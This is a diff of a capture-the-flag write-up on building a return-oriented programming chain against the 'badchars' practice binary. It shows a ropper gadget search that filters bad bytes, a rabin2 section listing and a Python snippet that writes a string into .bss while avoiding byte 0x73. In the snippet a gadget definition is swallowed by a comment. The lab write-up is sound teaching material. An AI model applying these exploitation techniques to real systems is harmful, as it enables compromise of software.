@@ -83,12 +83,15 @@ ropper --search "pop r12" -b 6269632f20666e73
 0x0000000000400b3b: pop r12; pop r13; ret;
 ```
 
-We also need to find somewhere to place the string into memory. We can find this by looking at the ELF's sections. Using `rabin2` from radare2
+Now that we can load our string into memory, we need to find somewhere to place the string into memory. We can find this by looking at the ELF's sections.
+
+Using `rabin2` from radare2
 ```
 rabin2 -S badchars
 ```
 ![data section](imgs/64bit/data.png)
 
+Code Snip of it all together
 ```
 data_start = 0x601080 # pop_r12_r13 = p64(0x400b3b)
 mov_r13_r12 = p64(0x400b34)
@@ -97,6 +100,7 @@ load_str_2 = pop_r12_r13 + flag_txt + p64(data_start+0x8) + mov_r13_r12
 load_str_3 = pop_r12_r13 + last_bit + p64(data_start+0x10) + mov_r13_r12
 load_str = load_str_1 + load_str_2 + load_str_3
 ```
+
 I'm using .bss(0x601080) instead of .data(0x601070) because the third char for the string would have landed at 0x601073 which ends in a bad char 0x73 aka 's'
 
 You could off set it by one and have the start be 0x601071 so then the third char is 0x601074 instead of 0x601073 it really doesn't matter.
